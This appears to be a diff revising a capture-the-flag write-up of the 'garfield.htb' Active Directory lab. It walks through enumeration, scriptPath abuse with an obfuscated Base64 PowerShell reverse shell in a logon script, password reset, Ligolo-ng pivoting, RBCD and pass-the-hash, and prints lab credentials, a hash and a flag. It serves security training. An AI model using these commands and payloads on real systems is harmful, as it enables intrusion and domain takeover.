@@ -9,10 +9,10 @@
 --------------------------------------------------------------------------------
 
 #### Table of Contents
-1. Reconnaissance
-2. Enumeration — User Discovery & Permission Analysis
-3. Initial Access — scriptPath Attribute Abuse
-4. Lateral Movement — ForceChangePassword & Tier 1 Access
+1. Reconnaissance — Rustscan & Nmap
+2. Enumeration — User Harvesting, SMB Exploration & AD Permissions
+3. Initial Access — Abuse of scriptPath Attribute
+4. Lateral Movement — ForceChangePassword to l.wilson_adm
 5. Network Pivoting — Ligolo-ng Tunneling to RODC
 6. Privilege Escalation — RBCD on Read-Only Domain Controller
 7. Final Compromise — Domain Admin via Pass-the-Hash
@@ -20,110 +20,178 @@
 --------------------------------------------------------------------------------
 
 #### 1. Reconnaissance
-The first step is to see what services are running on the target. We use **Rustscan** for speed and **Nmap** for detailed information.
+The engagement begins with identifying open ports and services. We use **Rustscan** for rapid port discovery and **Nmap** for service versioning and OS fingerprinting.
 
-**Port Discovery:**
+**Port Discovery (Rustscan):**
 ```bash
-rustscan -a 10.129.244.207
+➜  Downloads rustscan -a 10.129.244.207
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_    *}{ {* _  /  ___} / {} \ |  | |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+--------------------------------------------------------------------------------
+Open 10.129.244.207:53
+Open 10.129.244.207:88
+Open 10.129.244.207:135
+Open 10.129.244.207:139
+Open 10.129.244.207:389
+Open 10.129.244.207:445
+Open 10.129.244.207:464
+Open 10.129.244.207:593
+Open 10.129.244.207:636
+Open 10.129.244.207:2179
+Open 10.129.244.207:3268
+Open 10.129.244.207:3269
+Open 10.129.244.207:3389
+Open 10.129.244.207:5985
+Open 10.129.244.207:9389
 ```
-Rustscan identified several open ports including 53 (DNS), 88 (Kerberos), 389 (LDAP), and 5985 (WinRM).
 
-**Detailed Service Scanning:**
+**Service Scanning (Nmap):**
 ```bash
-nmap -A -p88,389,445,593,3268,2179 10.129.244.207
+➜  Downloads nmap -A -p88,389,445,593,3268,2179 10.129.244.207
+PORT     STATE SERVICE       VERSION
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-28 01:14:22Z)
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+2179/tcp open  vmrdp?
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
+
+Host script results:
+| clock-skew: 8h00m01s
+| smb2-security-mode:
+|   3.1.1:
+|     Message signing enabled and required
 ```
-**Findings:**
-The scan reveals the domain name is **garfield.htb** and the hostname is **DC01**. A key detail for Active Directory (AD) exploitation is the **clock skew** of 8 hours, as Kerberos authentication relies on synchronized time.
+The scan identifies the domain **garfield.htb** and the host **DC01**. An 8-hour clock skew is detected, which is important for Kerberos operations.
 
 --------------------------------------------------------------------------------
 
-#### 2. Enumeration — User Discovery & Permission Analysis
+#### 2. Enumeration — User Harvesting, SMB Exploration & AD Permissions
 ##### 2.1 — Username Extraction
-Using credentials for `j.arbuckle` (`Th1sD4mnC4t!@1978`), we list all users to see who else is in the domain.
+We use initial credentials for `j.arbuckle` (`Th1sD4mnC4t!@1978`) to list domain users via **netexec**.
 ```bash
-netexec smb garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
-awk '{print $5}' users > usernames.txt
-```
-This gave us a list of accounts including `l.wilson` and `l.wilson_adm`.
+➜  garfield netexec smb garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
+SMB         10.129.244.207  445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
+SMB         10.129.244.207  445    DC01             Administrator
+SMB         10.129.244.207  445    DC01             Guest
+SMB         10.129.244.207  445    DC01             krbtgt
+SMB         10.129.244.207  445    DC01             krbtgt_8245
+SMB         10.129.244.207  445    DC01             j.arbuckle
+SMB         10.129.244.207  445    DC01             l.wilson
+SMB         10.129.244.207  445    DC01             l.wilson_adm
 
-##### 2.2 — Finding Writable Permissions
-In AD, some users have "Write" permission over others, allowing them to change settings. We use **bloodyAD** to find these "hidden" powers.
-```bash
-bloodyAD --host garfield.htb -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable
+➜  garfield awk '{print $5}' users > usernames.txt
 ```
-**Critical Discovery:**
-Our user `j.arbuckle` has **WRITE** permission over the user **`l.wilson`**.
+
+##### 2.2 — SMB Share Enumeration (SYSVOL)
+We explore the `SYSVOL` share to understand the directory structure and check for existing scripts.
+```bash
+➜  garfield smbclient //10.129.244.207/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978'
+smb: > RECURSE ON
+smb: > ls
+\garfield.htb\scripts
+  .                                   D        0  Wed Jan 28 02:13:47 2026
+  ..                                  D        0  Wed Jan 28 02:13:47 2026
+  printerDetect.bat                   A      217  Sat Sep 13 02:20:29 2025
+```
+
+##### 2.3 — Finding Writable Permissions with bloodyAD
+BloodHound did not explicitly show certain permissions, so we use **bloodyAD** to identify objects we can modify.
+```bash
+➜  garfield bloodyAD --host garfield.htb -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable
+distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb permission: WRITE
+distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb permission: WRITE
+distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb permission: WRITE
+distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb permission: WRITE
+distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb permission: WRITE
+```
+We have **WRITE** permission over `l.wilson`, which allows us to abuse the `scriptPath` attribute.
 
 --------------------------------------------------------------------------------
 
-#### 3. Initial Access — scriptPath Attribute Abuse
-##### 3.1 — The scriptPath Mechanism
-The `scriptPath` attribute is a setting that tells Windows to run a specific script from the **SYSVOL** share whenever that user logs in. Since we have Write access to `l.wilson`, we can set this attribute ourselves.
+#### 3. Initial Access — Abuse of scriptPath Attribute
+##### 3.1 — Mechanism
+When a user logs in, AD checks the `scriptPath` attribute and runs the specified script from the `SYSVOL` share. 
 
-##### 3.2 — Preparing and Uploading the Payload
-We create a script called `printerDetect.bat` that contains a reverse shell. We upload it to the `scripts` folder where the Domain Controller expects to find it.
+##### 3.2 — Payload Preparation
+We create a `printerDetect.bat` file containing a Base64-encoded PowerShell reverse shell:
 ```bash
-smbclient //10.129.244.207/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb\scripts; put printerDetect.bat'
+➜  garfield cat printerDetect.bat
+@echo off
+powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMgAzADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
 ```
 
-##### 3.3 — Triggering the Reverse Shell
-We now update `l.wilson`'s account to point to our script. When the system checks this user, it will execute our shell.
+##### 3.3 — Upload and Attribute Modification
+We upload the malicious script to the DC and update the user's attribute:
 ```bash
-bloodyAD --host 10.129.244.207 -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v 'printerDetect.bat'
-```
-We listen for the connection on our machine:
-```bash
-nc -lnvp 4444
+➜  garfield smbclient //10.129.244.207/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb\scripts; put printerDetect.bat'
+
+➜  garfield bloodyAD --host 10.129.244.207 -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v 'printerDetect.bat'
 ```
 
 --------------------------------------------------------------------------------
 
-#### 4. Lateral Movement — ForceChangePassword & Tier 1 Access
-Once we have a shell as `l.wilson`, we find that this user has **ForceChangePassword** rights over `l.wilson_adm`. This allows us to take over the administrative version of the account.
-
-**Resetting the Password:**
+#### 4. Lateral Movement — ForceChangePassword to l.wilson_adm
+After catching the reverse shell as `l.wilson`, we find we have **ForceChangePassword** over `l.wilson_adm`.
 ```powershell
-$newpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newpass -Reset
+➜  garfield nc -lnvp 4444
+PS C:\Users\l.wilson\Documents\Scripts> $newpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+PS C:\Users\l.wilson\Documents\Scripts> Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newpass -Reset
 ```
-We verify we can now log in via WinRM and collect the user flag.
+
+We verify the credentials and access the user flag:
+```bash
+➜  garfield netexec winrm garfield.htb -u l.wilson_adm -p 'Password123!'
+WINRM       10.129.244.207  5985   DC01             [+] garfield.htb\l.wilson_adm:Password123! (Pwn3d!)
+
+➜  garfield evil-winrm -i 10.129.244.207 -u l.wilson_adm -p 'Password123!'
+PS C:\Users\l.wilson_adm\Desktop> type user.txt
+6eda20a351bf9082a8c1ab68f20c9bdf
+```
 
 --------------------------------------------------------------------------------
 
 #### 5. Network Pivoting — Ligolo-ng Tunneling to RODC
-We discover a second machine, **RODC01** (`192.168.100.2`), which is on a private network we cannot reach. We use **Ligolo-ng** to create a "tunnel," allowing our Kali machine to talk to that internal network.
+We discover an internal machine **RODC01** at `192.168.100.2`. We use **Ligolo-ng** to pivot into the private network.
 
 **On Kali:**
 ```bash
-sudo ./proxy -selfcert -laddr 0.0.0.0:11601
-sudo ip route add 192.168.100.0/24 dev ligolo
+➜  Ligolo sudo ./proxy -selfcert -laddr 0.0.0.0:11601
+➜  Tools sudo ip route add 192.168.100.0/24 dev ligolo
 ```
-**On the Target:**
+
+**On the Target (DC01):**
 ```powershell
-./agent -connect <KALI_IP>:11601 -ignore-cert
+PS C:\tmp> ./agent -connect 10.10.15.237:11601 -ignore-cert
 ```
+Verification: `ping 192.168.100.2` succeeds from Kali.
 
 --------------------------------------------------------------------------------
 
 #### 6. Privilege Escalation — RBCD on Read-Only Domain Controller
-##### 6.1 — Gaining RODC Admin Rights
-`l.wilson_adm` is a member of the **Tier 1** group, which has the special permission to add itself to the **RODC Administrators** group.
+##### 6.1 — Gaining RODC Admin
+As a member of the **Tier 1** group, we add ourselves to the **RODC Administrators** group.
 ```bash
-bloodyAD --host 10.129.244.207 -d garfield.htb -u l.wilson_adm -p 'Password123!' add groupMember "RODC Administrators" 'l.wilson_adm'
+➜  Tools bloodyAD --host 10.129.244.207 -d garfield.htb -u l.wilson_adm -p 'Password123!' add groupMember "RODC Administrators" 'l.wilson_adm'
 ```
 
 ##### 6.2 — Resource-Based Constrained Delegation (RBCD)
-Being an RODC admin gives us `WriteAccountRestrictions`. We abuse this to perform **RBCD**, essentially creating a fake computer and telling the RODC: "Trust this fake computer to act as the Administrator".
+We exploit the **WriteAccountRestrictions** ACE by creating a controlled machine account and configuring delegation to impersonate the Administrator on the RODC.
 
-**Step 1: Create a fake computer:**
+**Step 1: Create Fake Computer**
 ```bash
 impacket-addcomputer -computer-name 'FAKEMACHINE' -computer-pass 'FAKEMACHINE123!' -dc-ip 10.129.244.207 'garfield.htb/l.wilson_adm:Password123!'
 ```
-**Step 2: Configure delegation:**
+
+**Step 2: Configure Delegation**
 ```bash
 impacket-rbcd -action write -delegate-from 'FAKEMACHINE$' -delegate-to 'RODC01$' -dc-ip 10.129.244.207 'garfield.htb/l.wilson_adm:Password123!'
 ```
-**Step 3: Request a ticket for the Administrator:**
+
+**Step 3: Request Service Ticket**
 ```bash
 impacket-getST -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator -altservice host -dc-ip 10.129.244.207 'garfield.htb/FAKEMACHINE$:FAKEMACHINE123!'
 ```
@@ -131,19 +199,20 @@ impacket-getST -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator -altse
 --------------------------------------------------------------------------------
 
 #### 7. Final Compromise — Domain Admin via Pass-the-Hash
-##### 7.1 — Accessing RODC01
-We use our new ticket to log into the RODC as Administrator.
+##### 7.1 — RODC Access
+We use the ticket to authenticate to `RODC01`:
 ```bash
 export KRB5CCNAME=Administrator@host_RODC01.garfield.htb@GARFIELD.HTB.ccache
 impacket-wmiexec -k -no-pass -dc-ip 10.129.244.207 garfield.htb/Administrator@RODC01.garfield.htb
 ```
 
-##### 7.2 — Moving to the Main Domain Controller (DC01)
-After getting a reverse shell from RODC01 to bypass the "Double Hop" issue, we obtain the Domain Administrator's hash. We then use **Pass-the-Hash** to log into the main Domain Controller (`DC01`).
+##### 7.2 — Gaining Domain Admin on DC01
+To bypass the "Double Hop" issue, we execute a reverse shell on `RODC01` to perform operations back against the main DC. We obtain the Administrator hash and authenticate via **Pass-the-Hash** to `DC01`.
 ```bash
 evil-winrm -i 10.129.244.207 -u Administrator -H ee238f6debc752010428f20875b092d5
 ```
+
 **Root Flag:**
 ```powershell
-type C:\Users\Administrator\Desktop\root.txt
+PS C:\Users\Administrator\Desktop> type root.txt
 ```
